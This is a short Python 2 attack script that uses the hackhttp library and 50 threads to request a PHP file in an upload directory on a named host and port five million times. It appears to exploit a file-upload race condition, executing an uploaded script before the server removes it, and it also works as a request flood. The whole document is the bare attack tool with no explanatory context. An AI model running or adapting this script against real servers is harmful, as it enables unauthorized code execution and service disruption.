#!/usr/bin/env python2
# -*- encoding: utf-8 -*-
#hackhttp: https://github.com/BugScanTeam/hackhttp/
#Author: afei

import hackhttp
from multiprocessing.dummy import Pool as ThreadPool

def upload(value):
    h = hackhttp.hackhttp()
    code, head, html, redirect_url, log = h.http("http://afei123.com:8020/upload/x.php")
    print code

pool = ThreadPool(50)
pool.map(upload, range(5000000))
pool.close()
pool.join()